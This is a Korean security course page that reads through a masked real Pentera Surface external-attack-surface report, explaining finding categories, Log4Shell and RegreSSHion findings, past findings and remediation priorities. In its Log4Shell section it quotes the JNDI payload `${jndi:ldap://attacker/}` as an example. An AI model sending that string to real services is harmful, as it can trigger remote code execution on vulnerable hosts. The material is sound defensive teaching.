---
title: "Pentera Surface 리포트 읽기 (실제 사례)"
date: "2026-05-18"
category: "Pentera"
tags: ["Pentera Surface", "Attack Surface", "CVE", "리포팅"]
description: "실제 수행된 Pentera Surface Report를 따라 읽으며 Attractions, Vulnerabilities, Achievements의 차이와 조치 우선순위 잡는 법을 학습합니다."
---

> [슬라이드 보기 (프레젠테이션 모드)](/slides/week03-pentera-surface.html)

> **공개 안내**: 본 자료는 한 교내 조직에 대해 실제로 수행된 Pentera Surface Report를 학습용으로 정리한 것입니다. 모든 IP·호스트명·서브도메인은 마스킹 처리되었으며, 본문에 포함된 취약점 항목도 교육적 의미가 큰 일부만 발췌했습니다. 실제 자산 식별이 가능한 정보는 포함되지 않았습니다.

## 개요

3주차에서는 실제 운영 중인 조직에 대해 수행된 **Pentera Surface Report**를 그대로 펼쳐서 읽습니다. 외부 공격자가 도메인 하나로 시작해 어디까지 자산을 매핑하고, 무엇을 매력적으로 보고, 무엇을 실제로 익스플로잇할 수 있는지를 한 줄씩 따라갑니다.

> Week 02에서 다룬 **Pentera Core**가 네트워크 내부에서 침투를 검증하는 도구라면, **Pentera Surface**는 인터넷에 노출된 외부 공격면을 지속적으로 발견·평가하는 도구입니다. 같은 플랫폼의 EASM(External Attack Surface Management) 모듈이라고 보면 됩니다.

## 학습 목표

1. Surface Report의 6개 섹션 구성 이해
2. **Attraction · Vulnerability · Achievement** 세 개념의 차이 구분
3. 단일 도메인 입력만으로 외부 공격면이 어디까지 자동 매핑되는지 체감
4. CVSS 점수와 Pentera Achievement의 관계 해석
5. Past Findings를 활용한 조치 효과 검증

## 1. Executive Summary — 한 장으로 보는 공격면

![Pentera Surface Report - Executive Summary](/images/week03/executive-summary.png)

리포트 첫 페이지에 표시된 실제 공격면 요약입니다.

### Asset Inventory

| 자산 유형 | 개수 |
|-----------|------|
| Domains | 1 |
| Subdomains | 113 |
| IP Addresses | 42 |
| Networks | 0 |
| Services | 95 |
| Websites | 119 |
| **총 자산** | **370** |

> 시드로 입력한 것은 **도메인 단 하나**입니다. Pentera는 자동으로 **113개의 서브도메인**과 **119개의 웹사이트**까지 발견했습니다. 공격자도 같은 일을 합니다 — `subfinder`, `amass` 같은 도구로 몇 분이면 됩니다.

### Impacting Findings

| 카테고리 | 총 개수 | Extreme/Critical | Serious/High | Moderate/Medium | Minimal/Low |
|----------|---------|------------------|--------------|------------------|-------------|
| **Attractions** | 326 | 1 | 61 | 255 | 9 |
| **Vulnerabilities** | 83 | 6 | 36 | 27 | 14 |
| **Achievements** | 96 | 5 | 5 | 7 | 79 |

> 326개 "매력적 표면" 중 단 1개가 Extreme. 그 1개가 무엇인지가 가장 먼저 봐야 할 질문입니다. 스포일러: **Log4Shell**.

## 2. 세 가지 개념 구분 — Attraction / Vulnerability / Achievement

Pentera Surface 리포트는 세 가지를 분리해서 보고합니다. 차이를 이해해야 우선순위를 잡을 수 있습니다.

| 개념 | 정의 | 예시 |
|------|------|------|
| **Attraction** | 공격자에게 "매력적으로 보이는" 표면 (실제 취약 여부는 미확정) | 만료된 SSL 인증서, 노출된 SSH 포트 |
| **Vulnerability** | 실제로 확인된 보안 약점 (CVE 매핑 가능) | RegreSSHion CVE-2024-6387 |
| **Achievement** | Pentera가 실제로 익스플로잇에 성공한 결과 | Open Redirect로 외부 서버 리디렉트 성공 |

```
Attraction  ⊇  Vulnerability  ⊇  Achievement
(매력 326)    (확인 83)         (성공 96)
```

> Achievement가 Vulnerability보다 개수가 많은 이유: 같은 취약점이 여러 자산에서 반복 익스플로잇되거나, CVE 없이 "Found Exposed Database" 같은 비-CVE 성취도 포함되기 때문입니다.

## 3. Pentera's Top Actions — CVE 체크리스트

![Pentera Top Actions](/images/week03/top-actions.png)

Pentera는 핵심 CVE 리스트를 자동으로 검사합니다. 위 표에서 대부분의 Critical CVE는 **Not Found** — 즉 외부에서 직접 익스플로잇 가능한 자산이 없음이 확인되었습니다.

하지만 일부 항목은 **Found** 상태입니다.

| Risk | Action | 검사 결과 |
|------|--------|-----------|
| High | Exploited Open Redirect vulnerability | 일부 웹 자산에서 익스플로잇 성공 |
| High | Search for enabled Remote MySQL connection | 외부 노출 MySQL 발견 |
| Medium | Exploited Reflected XSS | 1개 자산에서 동작 확인 |
| Medium | Detect DB Servers | 외부 노출 DB 2건 |

> 핵심: **단 1개라도 Found이면 우선순위 큐의 맨 앞에 와야 합니다.** "다 안 뚫리고 1개만 뚫렸다"는 안심의 근거가 아니라 행동의 신호입니다.

## 4. 흥미로운 발견 ① — Potential Log4Shell

326개 Attractions 중 단 하나의 **Extreme** 등급이 이것입니다.

- **점수**: Extreme
- **CVE**: CVE-2021-44228
- **자산**: `xxx.xxx.xxx.xx:9003/tcp` (IP 마스킹)
- **상태**: 직접 익스플로잇 PoC는 실패했지만, **Log4j 사용 흔적이 있는 서비스**가 발견됨

> Top Actions에서는 "Log4Shell Not Found"인데 Attractions에서는 "Potential Log4Shell"이 1건 — 이 차이가 핵심입니다. Pentera의 자동 익스플로잇 시도는 실패했지만, 트래픽 패턴이나 응답 헤더에서 Log4j 의심 신호가 잡혔다는 뜻입니다. **수동 검증 1순위.**

### 왜 4년 지난 CVE가 아직도 1순위인가

| 항목 | 값 |
|------|---|
| 공개 | 2021-12-09 |
| CVSS | 10.0 (Maximum) |
| 익스플로잇 난이도 | 매우 낮음 — `${jndi:ldap://attacker/}` 한 줄 |
| Active Exploitation in Wild | YES (현재까지) |
| CISA KEV 등재 | YES |

> "옛날 CVE니까 다 패치되었을 것"이라는 가정은 위험합니다. 4년이 지난 지금도 인터넷에는 미패치 자산이 남아있고, 자동화 봇이 24시간 스캔합니다.

## 5. 흥미로운 발견 ② — RegreSSHion (CVE-2024-6387)

신규 발견 사례. Vulnerabilities 섹션 최상위에 위치.

- **점수**: 8.1 (High)
- **CVE**: CVE-2024-6387
- **자산**: `xxx.xxx.xxx.xx:22/tcp` (IP 마스킹)
- **영향**: OpenSSH 8.5p1 ~ 9.8p1
- **결과**: 인증 없는 원격 코드 실행 (Root 권한)

### 왜 "Regression"이라는 이름인가

2006년에 패치되었던 OpenSSH 취약점(CVE-2006-5051)이 2020년 즈음 코드 리팩토링 과정에서 **다시 부활**했기 때문입니다.

```
2006   CVE-2006-5051  발견 및 패치
       ↓ (시간 흐름)
2020   리팩토링 과정에서 동일 결함 재도입
       ↓
2024   재발견 → CVE-2024-6387 (RegreSSHion)
```

> 보안 픽스도 회귀(regression)할 수 있다는 강력한 사례. "한 번 고친 CVE는 영원히 고쳐진다"는 가정도 깨집니다. **CI/CD에 보안 회귀 테스트가 필요한 이유입니다.**

### 익스플로잇 난이도

8.1점이지만 실제 익스플로잇은 어렵습니다.

- 글리비식 기반 리눅스에서 약 **6시간~8시간**의 타이밍 공격 필요
- 32비트 시스템에서는 분 단위로 단축 가능
- 그러나 자동화 봇은 시간을 신경 쓰지 않음 → **외부 노출 SSH 자체가 표적**

## 6. Past Findings — 조치 효과의 증거

리포트 후반부의 Past Findings 섹션은 **과거에는 발견되었으나 현재는 외부에서 보이지 않는 항목**을 기록합니다.

| 점수 | 과거 발견 항목 | 상태 |
|------|----------------|------|
| 9.8 | PrestaShop SQL Injection (CVE-2023-30150) | 해결됨 |
| 8.3 | API secrets exposed in web page content | 해결됨 |
| 5.3 | Remote MySQL connection enabled | 일부 해결, **타 자산에 여전히 영향** |
| 4.5 | Database exposed to the internet | 일부 해결, **타 자산에 여전히 영향** |
| 1.9 | Enumerated Git repository hosting service | 해결됨 |

> **"Note this vulnerability type is still affecting other assets"** 표시는 "한 자산은 고쳤지만 같은 유형이 다른 자산에 남아있다"는 경고입니다. **자산 A의 MySQL은 닫았는데 자산 B는 열려있는** 전형적 패치 누락.

## 7. 우선순위 잡기 — 1-3-5 원칙

리포트 전체를 보고 조치 우선순위를 정할 때.

- **1주차에 1개**: Extreme 1건. 위 사례에서는 **Potential Log4Shell** 수동 검증. 진짜면 격리 → 패치 → 재검사.
- **1개월에 3개**: 신규 CVE + 외부 노출 DB + 외부 노출 SSH. RegreSSHion 패치, MySQL 방화벽, SSH 외부 차단.
- **1분기에 5개**: 만료 인증서 일괄 갱신, 약한 cipher 정리, 서브도메인 인벤토리, IP 노출 포트 정책 재검토, 운영 자산 owner 매핑.

> 모든 취약점을 한꺼번에 잡으려는 것이 가장 흔한 실패 패턴입니다. **Extreme 1건을 끝까지 추적하는 것**이 326건을 동시에 훑는 것보다 가치 있습니다.

## 8. 흔한 실수

- **CVSS 9.8이 Past로 표시되면 안전하다** ← Past는 "현재 해당 자산에서 안 보임"일 뿐. 다른 자산에 같은 패턴 확인 필요.
- **Attraction이 많아도 Vulnerability가 적으면 OK** ← Attraction은 "매력적으로 보임". 326개 모두가 공격자 정찰의 출발점.
- **외부에서 안 보이면 안전** ← Surface는 외부만 봅니다. 내부망 침투 검증은 Pentera Core로 별도 수행 필요.
- **"4년 지난 CVE는 다 패치됨"** ← Log4Shell이 아직도 1건씩 잡힙니다. 시간이 흐른다고 자동으로 안전해지지 않습니다.

## 핵심 정리

- **외부 자산은 시드 1개에서 수백 개로 자동 확장됨** — 도메인 하나 입력으로 370개 자산이 매핑됨
- **Attraction / Vulnerability / Achievement는 다른 개념** — 매력적 표면이 곧 취약점은 아니며, 취약점이 곧 익스플로잇 가능한 것도 아님
- **Extreme 1건이 Moderate 255건보다 우선** — 개수가 아니라 등급과 익스플로잇 가능성 기준
- **신규 CVE와 회귀 CVE 모두 위협** — RegreSSHion처럼 한 번 고쳤다고 영원히 안전한 것은 아님
- **Past Findings는 조치의 증거이자 누락의 단서** — "다른 자산에 여전히 영향" 경고를 놓치지 말 것
